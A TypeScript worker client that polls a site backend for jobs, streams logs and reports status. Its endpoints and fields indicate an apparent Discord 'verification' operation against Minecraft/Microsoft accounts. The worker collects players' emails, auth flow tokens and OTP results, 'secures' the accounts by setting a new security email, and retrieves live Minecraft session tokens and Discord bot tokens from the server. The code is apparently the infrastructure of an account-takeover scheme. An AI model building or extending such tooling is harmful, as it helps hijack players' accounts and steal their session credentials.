const SITE_URL = (process.env.SITE_URL || "").replace(/\/+$/, "");
const WORKER_SECRET = process.env.WORKER_SECRET!;
/** Single source of truth — index.ts must use the same value via env WORKER_ID */
export const WORKER_ID = process.env.WORKER_ID || "worker-1";

const MAX_LOG_BUFFER = 500;

const headers = {
  "Content-Type": "application/json",
  "x-worker-secret": WORKER_SECRET,
};

export interface Job {
  id: string;
  discord_id: string;
  type: string;
  config: unknown;
}

async function fetchWithRetry(url: string, opts: RequestInit, retries = 2): Promise<Response> {
  for (let i = 0; i <= retries; i++) {
    try {
      const res = await fetch(url, opts);
      if (res.ok) return res;
      if (res.status >= 400 && res.status < 500) return res;
      if (i === retries) return res;
    } catch (e) {
      if (i === retries) throw e;
      await new Promise((r) => setTimeout(r, 1000 * (i + 1)));
    }
  }
  throw new Error("unreachable");
}

export async function pollJobs(workerId: string, limit?: number): Promise<Job[]> {
  const res = await fetchWithRetry(`${SITE_URL}/api/bots/worker/poll`, {
    method: "POST",
    headers,
    body: JSON.stringify({
      worker_id: workerId,
      limit: Math.max(1, Math.min(limit ?? 3, 10)),
    }),
  });
  if (!res.ok) throw new Error(`poll failed: ${res.status}`);
  const data = await res.json();
  return data.jobs ?? [];
}

export interface OtpPendingSession {
  id: string;
  discord_id: string;
  guild_id: string;
  mc_username: string;
  mc_email: string;
  flow_token: string | null;
  security_email: string | null;
  channel_id: string | null;
}

export async function pollOtpPending(
  workerId: string,
  limit = 3,
): Promise<OtpPendingSession[]> {
  const res = await fetchWithRetry(`${SITE_URL}/api/bots/worker/otp-pending`, {
    method: "POST",
    headers,
    body: JSON.stringify({ worker_id: workerId, limit }),
  });
  if (!res.ok) throw new Error(`otp-pending failed: ${res.status}`);
  const data = await res.json();
  return data.sessions ?? [];
}

export async function reportOtpResult(input: {
  session_id: string;
  ok: boolean;
  security_email?: string;
  proof_id?: string;
  error?: string;
}): Promise<boolean> {
  const res = await fetchWithRetry(`${SITE_URL}/api/bots/worker/otp-result`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  return res.ok;
}

export async function fetchPresenceTokens(): Promise<
  Array<{ bot_token: string; guild_id: string; label?: string }>
> {
  try {
    const res = await fetchWithRetry(`${SITE_URL}/api/bots/worker/presence-tokens`, {
      method: "GET",
      headers,
    });
    if (!res.ok) {
      console.error(`[worker] fetchPresenceTokens HTTP ${res.status}`);
      return [];
    }
    const text = await res.text();
    let data: { bots?: Array<{ bot_token: string; guild_id: string; label?: string }> };
    try {
      data = JSON.parse(text);
    } catch {
      console.error(
        `[worker] fetchPresenceTokens non-json (ct=${res.headers.get("content-type") || "?"}): ${text.slice(0, 80)}`,
      );
      return [];
    }
    return data.bots ?? [];
  } catch (e) {
    console.error("[worker] fetchPresenceTokens failed:", e);
    return [];
  }
}

export interface LogEntry {
  job_id: string;
  discord_id: string;
  level: string;
  message: string;
}

const logBuffer: LogEntry[] = [];
let flushTimer: ReturnType<typeof setTimeout> | null = null;
let flushFailures = 0;

function scheduleFlush() {
  if (flushTimer) return;
  const delay = Math.min(2000 * Math.pow(2, flushFailures), 30000);
  flushTimer = setTimeout(() => {
    flushTimer = null;
    flushLogs();
  }, delay);
}

async function flushLogs() {
  if (logBuffer.length === 0) return;
  const batch = logBuffer.splice(0, 50);
  try {
    const res = await fetchWithRetry(`${SITE_URL}/api/bots/worker/log`, {
      method: "POST",
      headers,
      body: JSON.stringify(batch),
    });
    if (!res.ok) {
      const text = await res.text().catch(() => "");
      console.error(`[worker] log flush HTTP ${res.status}: ${text.slice(0, 200)}`);
      logBuffer.unshift(...batch);
      while (logBuffer.length > MAX_LOG_BUFFER) logBuffer.shift();
      flushFailures++;
    } else {
      flushFailures = 0;
    }
  } catch (e) {
    console.error("[worker] log flush failed:", e);
    logBuffer.unshift(...batch);
    while (logBuffer.length > MAX_LOG_BUFFER) {
      logBuffer.shift();
    }
    flushFailures++;
  }
  if (logBuffer.length > 0) scheduleFlush();
}

export function createLogger(jobId: string, discordId: string) {
  return async (level: string, message: string, immediate = false) => {
    // Always mirror to worker terminal (helps debug when site log pipeline fails)
    const short = jobId.slice(0, 8);
    console.log(`[job ${short}] [${level}] ${message}`);

    logBuffer.push({ job_id: jobId, discord_id: discordId, level, message });
    const forceFlush =
      immediate ||
      message.startsWith("MS_AUTH_REQUIRED|") ||
      level === "error" ||
      level === "system" ||
      level === "bot" ||
      /logged in|spawned|connecting|ssid|waiting \d+s before first/i.test(message);

    if (forceFlush) {
      if (flushTimer) {
        clearTimeout(flushTimer);
        flushTimer = null;
      }
      await flushLogs();
      return;
    }
    scheduleFlush();
  };
}

const TERMINAL = new Set(["error", "stopped", "completed", "pending"]);

/** Failed terminal writes — retried on next poll so jobs don't stay "running" forever */
const pendingTerminal = new Map<string, { status: string; error?: string; tries: number }>();

export async function updateJob(jobId: string, status: string, error?: string): Promise<boolean> {
  const body: Record<string, string> = { job_id: jobId, status, worker_id: WORKER_ID };
  if (error) body.error = error;
  const attempts = TERMINAL.has(status) ? 4 : 2;
  let lastErr = "";
  for (let i = 0; i < attempts; i++) {
    try {
      const res = await fetchWithRetry(`${SITE_URL}/api/bots/worker/update`, {
        method: "POST",
        headers,
        body: JSON.stringify(body),
      });
      if (res.ok) {
        pendingTerminal.delete(jobId);
        return true;
      }
      lastErr = `HTTP ${res.status}`;
      // Terminal updates: one more try without worker_id binding (server retries unbound on 409)
      if (res.status === 409 && TERMINAL.has(status) && i === attempts - 2) {
        const loose = { ...body };
        delete (loose as { worker_id?: string }).worker_id;
        const res2 = await fetchWithRetry(`${SITE_URL}/api/bots/worker/update`, {
          method: "POST",
          headers,
          body: JSON.stringify(loose),
        });
        if (res2.ok) {
          pendingTerminal.delete(jobId);
          return true;
        }
        lastErr = `HTTP ${res2.status}`;
      }
    } catch (e) {
      lastErr = e instanceof Error ? e.message : String(e);
    }
    if (i < attempts - 1) await new Promise((r) => setTimeout(r, 500 * (i + 1)));
  }
  console.error(`[worker] update FAILED job ${jobId} → ${status}: ${lastErr}`);
  if (TERMINAL.has(status) && status !== "pending") {
    const prev = pendingTerminal.get(jobId);
    pendingTerminal.set(jobId, {
      status,
      error,
      tries: (prev?.tries ?? 0) + 1,
    });
  }
  return false;
}

/** Retry any terminal status writes that failed while the API was down */
export async function flushPendingTerminalUpdates(): Promise<void> {
  if (pendingTerminal.size === 0) return;
  const entries = [...pendingTerminal.entries()];
  for (const [jobId, entry] of entries) {
    if (entry.tries > 40) {
      console.error(`[worker] giving up terminal retry for ${jobId} after ${entry.tries} tries`);
      pendingTerminal.delete(jobId);
      continue;
    }
    const ok = await updateJob(jobId, entry.status, entry.error);
    if (ok) {
      console.log(`[worker] recovered terminal update for ${jobId} → ${entry.status}`);
    }
  }
}

/** Only write terminal status if the job is still running/claimed (never clobber error/stopped). */
export async function finalizeJob(
  jobId: string,
  status: "completed" | "error" | "stopped",
  error?: string,
): Promise<boolean> {
  return updateJob(jobId, status, error);
}

export async function flushAllLogs() {
  if (flushTimer) {
    clearTimeout(flushTimer);
    flushTimer = null;
  }
  while (logBuffer.length > 0) {
    await flushLogs();
  }
}

import type { SecureJobConfig, SecureResult } from "./secure.js";

export async function postVerificationResult(config: SecureJobConfig, result: SecureResult) {
  const res = await fetchWithRetry(`${SITE_URL}/api/verification/complete`, {
    method: "POST",
    headers,
    body: JSON.stringify({
      config,
      result,
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error(`postVerificationResult failed: HTTP ${res.status} ${text}`);
  }
}

/** Mark verification_sessions failed/otp_sent so users are not stuck in "securing" forever */
export async function markVerificationSession(
  sessionId: string | undefined | null,
  status: "failed" | "otp_sent" | "secured",
): Promise<boolean> {
  if (!sessionId) return true;
  for (let i = 0; i < 3; i++) {
    try {
      const res = await fetchWithRetry(`${SITE_URL}/api/verification/session-status`, {
        method: "POST",
        headers,
        body: JSON.stringify({ session_id: sessionId, status }),
      });
      if (res.ok) return true;
      console.error(`[worker] markVerificationSession HTTP ${res.status} (try ${i + 1})`);
    } catch (e) {
      console.error("[worker] markVerificationSession failed:", e);
    }
    await new Promise((r) => setTimeout(r, 400 * (i + 1)));
  }
  return false;
}

/** null = request failed (do not treat as empty / no status changes) */
export async function checkJobStatuses(
  workerId: string,
  jobIds: string[],
): Promise<{ id: string; status: string }[] | null> {
  try {
    const res = await fetchWithRetry(`${SITE_URL}/api/bots/worker/status`, {
      method: "POST",
      headers,
      body: JSON.stringify({ worker_id: workerId, job_ids: jobIds }),
    });
    if (!res.ok) {
      console.error(`[worker] checkJobStatuses HTTP ${res.status}`);
      return null;
    }
    const data = await res.json();
    return data.jobs ?? [];
  } catch (e) {
    console.error("[worker] checkJobStatuses failed:", e);
    return null;
  }
}

export type McSessionResponse =
  | {
      ok: true;
      accountId: string;
      token: string;
      username: string;
      uuid: string;
      rawUuid: string;
      label?: string;
    }
  | {
      ok: false;
      error: string;
      code?: string;
      httpStatus?: number;
    };

/**
 * Live SSID from site DB (so Refresh Token applies without relaunch).
 * Falls back to job-config token only if caller provides it separately.
 */
export async function fetchMcSession(opts: {
  jobId?: string;
  accountId?: string;
  discordId?: string;
}): Promise<McSessionResponse> {
  try {
    const res = await fetchWithRetry(`${SITE_URL}/api/bots/worker/mc-session`, {
      method: "POST",
      headers,
      body: JSON.stringify({
        job_id: opts.jobId,
        account_id: opts.accountId,
        discord_id: opts.discordId,
      }),
    });
    const data = (await res.json().catch(() => ({}))) as Record<string, unknown>;
    if (!res.ok) {
      return {
        ok: false,
        error: String(data.error || `HTTP ${res.status}`),
        code: typeof data.code === "string" ? data.code : undefined,
        httpStatus: res.status,
      };
    }
    if (!data.token || !data.username) {
      return { ok: false, error: "Session response missing token/username" };
    }
    return {
      ok: true,
      accountId: String(data.accountId || opts.accountId || ""),
      token: String(data.token),
      username: String(data.username),
      uuid: String(data.uuid || ""),
      rawUuid: String(data.rawUuid || ""),
      label: data.label != null ? String(data.label) : undefined,
    };
  } catch (e) {
    return {
      ok: false,
      error: e instanceof Error ? e.message : String(e),
      code: "network",
    };
  }
}

/** Mark mc_accounts.status = token_expired after runtime auth failure */
export async function markMcAccountExpired(
  accountId: string | undefined,
  discordId?: string,
): Promise<void> {
  if (!accountId) return;
  try {
    await fetchWithRetry(`${SITE_URL}/api/bots/worker/mc-session`, {
      method: "POST",
      headers,
      body: JSON.stringify({
        account_id: accountId,
        discord_id: discordId,
        mark_expired: true,
      }),
    });
  } catch (e) {
    console.error("[worker] markMcAccountExpired failed:", e);
  }
}
